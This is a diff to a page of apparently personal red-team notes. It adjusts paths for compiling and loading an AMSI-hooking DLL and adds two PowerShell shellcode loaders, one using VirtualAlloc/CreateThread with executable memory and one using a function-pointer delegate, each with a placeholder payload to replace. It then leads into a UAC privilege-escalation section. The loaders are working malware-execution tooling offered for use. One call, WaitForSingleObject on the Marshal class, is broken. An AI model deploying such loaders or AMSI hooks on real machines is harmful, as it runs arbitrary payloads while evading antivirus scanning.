@@ -617,10 +617,10 @@ public class AmsiHook
 }
 </code></pre>
 <p>Next, compile the C# code into a DLL:</p>
-<pre><code class="language-sh">csc /target:library /out:/Users/luks/_code/thev/src/AmsiHook.dll /Users/luks/_code/thev/src/AmsiHook.cs
+<pre><code class="language-sh">csc /target:library /out:C:\git\code\amsidll\AmsiHook.dll C:\git\code\amsidll\AmsiHook.cs
 </code></pre>
 <p>Then, create a PowerShell script to load the DLL and hook AMSI functions:</p>
-<pre><code class="language-powershell">Add-Type -Path &quot;/Users/luks/_code/thev/src/AmsiHook.dll&quot;
+<pre><code class="language-powershell">Add-Type -Path &quot;C:\git\code\amsidll\AmsiHook.dll&quot;
 
 # Hook AMSI functions
 [AmsiHook]::HookAmsi()
@@ -674,7 +674,51 @@ Write-Output &quot;[+] CSharp Shellcode written to: $filename&quot;
 <h1><a class="header" href="#powershell" id="powershell">Powershell</a></h1>
 <p>AMSI
 Invoke-Obfuscastion
-powershell shellcode loader (withou amsi bypass)</p>
+powershell shellcode loader (without amsi bypass)</p>
+<pre><code class="language-powershell">$shellcode = @(0x90,0x90,0x90,0x90) # Replace with your shellcode
+
+$code = @&quot;
+using System;
+using System.Runtime.InteropServices;
+public class Win32 {
+    [DllImport(&quot;kernel32.dll&quot;, SetLastError=true)] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+    [DllImport(&quot;kernel32.dll&quot;, SetLastError=true)] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+    [DllImport(&quot;msvcrt.dll&quot;, SetLastError=true)] public static extern IntPtr memcpy(IntPtr dest, byte[] src, uint count);
+}
+&quot;@
+
+Add-Type -TypeDefinition $code
+
+# Allocate memory
+$mem = [Win32]::VirtualAlloc([IntPtr]::Zero, $shellcode.Length, 0x3000, 0x40)
+
+# Copy shellcode to memory
+[Win32]::memcpy($mem, $shellcode, $shellcode.Length)
+
+# Create thread to execute shellcode
+$thread = [Win32]::CreateThread([IntPtr]::Zero, 0, $mem, [IntPtr]::Zero, 0, [IntPtr]::Zero)
+
+# Wait for thread to exit (optional)
+[System.Runtime.InteropServices.Marshal]::WaitForSingleObject($thread, 0xFFFFFFFF)
+</code></pre>
+<p>Shorter version:</p>
+<pre><code class="language-powershell">$shellcode = @(0x90,0x90,0x90,0x90) # Replace with your shellcode
+
+# Allocate memory
+$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($shellcode.Length)
+
+# Copy shellcode to memory
+[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $mem, $shellcode.Length)
+
+# Create thread to execute shellcode
+$thread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($mem, [System.Threading.ThreadStart])
+
+# Start the thread
+$thread.Invoke()
+
+# Wait for thread to exit (optional)
+[System.Threading.Thread]::Sleep(-1)
+</code></pre>
 <h1><a class="header" href="#uac---user-account-control-privilege-escalation" id="uac---user-account-control-privilege-escalation">UAC - User Account Control (Privilege Escalation)</a></h1>
 <p>MITRE Reference</p>
 <p><img src="./images/uac_mitre.jpg" alt="image" /></p>
